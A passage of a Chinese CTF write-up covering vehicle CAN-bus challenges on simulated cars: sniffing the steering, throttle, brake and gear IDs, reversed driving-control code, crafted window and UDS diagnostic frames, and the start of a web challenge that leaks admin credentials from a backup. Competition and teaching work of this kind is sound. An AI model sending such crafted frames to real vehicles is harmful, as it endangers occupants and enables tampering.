punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">82</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">99</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.328627</span>  <span class="token number">401</span>  FF E3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么可以猜测和方向盘有关的报文ID为401</p><p>同理测油门：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">33</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  00 <span class="token number">40</span> 00 00 00 00 00 00 .@<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.072732</span>  <span class="token number">204</span>  <span class="token number">22</span> 00 00 00 00 00 00 00 <span class="token string">".......0.000000  2F6  0A 00 00 00 00 00 00 00 ........0.000000  30F  03 E6 00 00 00 00 00 00 ........0.000000  314  00 40 00 00 00 00 00 00 .@......7.018217  315  00 10 00 00 00 00 00 00 ........7.020064  32F  00 01 00 00 00 00 00 00 ........0.050987  402  22 00 00 00 00 00 00 00 "</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">49</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.008977</span>  <span class="token number">105</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.187966</span>  <span class="token number">204</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">2.005456</span>  30F  03 E4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003900</span>  <span class="token number">314</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.999780</span>  <span class="token number">315</span>  00 2B 00 00 00 00 00 00 .+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.004486</span>  31F  00 05 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.998573</span>  32F  00 08 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.059475</span>  <span class="token number">402</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报文ID为402</p><p>刹车：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">29</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">1.003801</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.245428</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">1.007777</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003799</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">7.006076</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.007778</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003865</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.067160</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">31</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报文ID为403</p><p>档位：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">21</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.000811</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">314</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.001970</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.001312</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">24</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报文ID为404</p><p>flag：<code>dk_flag&#123;401_402_403_404&#125;</code></p><hr><h2 id="自动驾驶域"><a href="#自动驾驶域" class="headerlink" title="自动驾驶域"></a>自动驾驶域</h2><h3 id="自动驾驶逻辑破解"><a href="#自动驾驶逻辑破解" class="headerlink" title="自动驾驶逻辑破解"></a>自动驾驶逻辑破解</h3><p>逆向出来的核心逻辑：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 挂1档</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 踩油门到40度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 挂2档</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 踩油门到50度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 401#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 左转30度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 松开油门</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 踩刹车到70度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">receive_can_message</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">789</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 挂N档</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 松开刹车</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自动驾驶逻辑：先挂1档起步，踩油门到40度，车速 27km&#x2F;h 左右；然后挂2档，车速 35km&#x2F;h 左右，踩油门到50度，车速 14km&#x2F;h 左右；接下来方向盘左转30度，车速 9km&#x2F;h 左右，松开油门；踩刹车到70度，挂N档，然后松开刹车，停车</p><hr><h2 id="车身域"><a href="#车身域" class="headerlink" title="车身域"></a>车身域</h2><h3 id="车窗报文获取"><a href="#车窗报文获取" class="headerlink" title="车窗报文获取"></a>车窗报文获取</h3><blockquote><p>操作虚拟车辆，尝试获取车窗状态报文ID（例如车窗的状态报文ID为0x123，则提交123），提交到平台（格式:dk_flag{十六进制消息ID}）。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">83</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">64</span> <span class="token number">64</span> 00 00 00 00 .ddd<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">87</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">3.572785</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">46</span> <span class="token number">64</span> 00 00 00 00 .dFd<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>06 delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">2.231212</span>   <span class="token number">91</span>  00 <span class="token number">64</span> 1E <span class="token number">64</span> 00 00 00 00 .d.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">80</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>   <span class="token number">91</span>  00 00 00 <span class="token number">64</span> 00 00 00 00 <span class="token punctuation">..</span>.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>dk_flag&#123;091&#125;</code></p><h3 id="车窗控制"><a href="#车窗控制" class="headerlink" title="车窗控制"></a>车窗控制</h3><blockquote><p>操作虚拟车辆，获取车窗状态报文，逆向分析报文协议，通过逆向结果尝试构造左前车窗升起30%，左后升起50%，右前车窗升起70%，右后车窗升起30%的报文，通过CAN ID 0x11发送该构造好的报文到仿真车辆，可通过虚拟车辆仪表页面验证构造结果。假如构造的报文是cansend can0  011#01010101，则提交01010101，提到平台（格式:dk_flag{报文}）</p></blockquote><p>四个十六进制位依次代表：左前 右前 左后 右后</p><p>开启是0x00，关闭是0x64</p><p>那么升起30%是0x1E，升起50%是0x32，升起70%是0x46</p><p>flag：<code>dk_flag&#123;1E46321E&#125;</code></p><hr><h2 id="OBD2"><a href="#OBD2" class="headerlink" title="OBD2"></a>OBD2</h2><h3 id="车辆VIN读取"><a href="#车辆VIN读取" class="headerlink" title="车辆VIN读取"></a>车辆VIN读取</h3><blockquote><p>小张是一名车联网安全专家，负责评估一款新型智能网联汽车的安全性。这款汽车支持UDS（统一诊断服务）协议，允许通过标准化的诊断命令读取或者写入车辆信息和执行维护操作。为了确保系统的安全性，小张决定决定依照UDS标准尝试篡改改这辆车的VIN码，他想先获取下当前车辆的VIN码。通过查询手册，他构造了730#0322F190这样一个报文来读取车辆的VIN，现在要求你在can1口上发送这样报文，也参照UDS标准的定义，对响应结果进行解析，从中提取出车辆的VIN字符串，提交到平台（格式:dk_flag{VIN字符串}）。</p></blockquote><p>发送报文，另一边抓包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">730</span><span class="token comment">#0322F190</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110094112861.png" alt="image-20250110094112861"></p><p><code>candump can1</code>下来看具体的十六进制包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">can1  <span class="token number">730</span>   <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>  03 <span class="token number">22</span> F1 <span class="token number">90</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">10</span> <span class="token number">14</span> <span class="token number">62</span> F1 <span class="token number">90</span> <span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">21</span> 5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">22</span> <span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>参考：</p><p><a href="https://www.iodraw.com/blog/221207386">https://www.iodraw.com/blog/221207386</a></p><p><a href="https://blog.csdn.net/qq_40242571/article/details/120756736">https://blog.csdn.net/qq_40242571/article/details/120756736</a></p><p>VIN码一般是17位的，取出其中的有效响应数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span><span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解码即可得到VIN码</p><p>flag：<code>dk_flag&#123;WYUZA1S2FEDK00001&#125;</code></p><h3 id="车辆故障数量读取"><a href="#车辆故障数量读取" class="headerlink" title="车辆故障数量读取"></a>车辆故障数量读取</h3><blockquote><p>小张是一名车联网安全专家，负责评估一款新型智能网联汽车的安全性。这款汽车支持UDS（统一诊断服务）协议，允许通过标准化的诊断命令读取或者写入车辆信息和执行维护操作。为了确保系统的安全性，小张决定决定依照UDS标准尝试读取当前车辆故障数量。通过查询手册，他构造了710#03190103这样一个报文来读取车辆的故障数量，现在要求你在can1口上发送这样报文，也参照UDS标准的定义，对响应结果进行解析，从中提取出车辆的故障数量，提交到平台（格式:dk_flag{故障数量}）。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">710</span><span class="token comment">#03190103</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110095040842.png" alt="image-20250110095040842"></p><p>猜测是718上的某位数字</p><p>flag：<code>dk_flag&#123;2&#125;</code></p><hr><h1 id="信创安全挑战区"><a href="#信创安全挑战区" class="headerlink" title="信创安全挑战区"></a>信创安全挑战区</h1><h2 id="misc-入侵流量监测"><a href="#misc-入侵流量监测" class="headerlink" title="misc-入侵流量监测"></a>misc-入侵流量监测</h2><p>date，爆破8位日期即可</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109100514281.png" alt="image-20250109100514281"></p><hr><h2 id="web-国产办公软件漏洞利用"><a href="#web-国产办公软件漏洞利用" class="headerlink" title="web-国产办公软件漏洞利用"></a>web-国产办公软件漏洞利用</h2><p>data\backup\2025-01-03_MD4zU</p><p>后台admin账密</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_cache_user_detail<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token 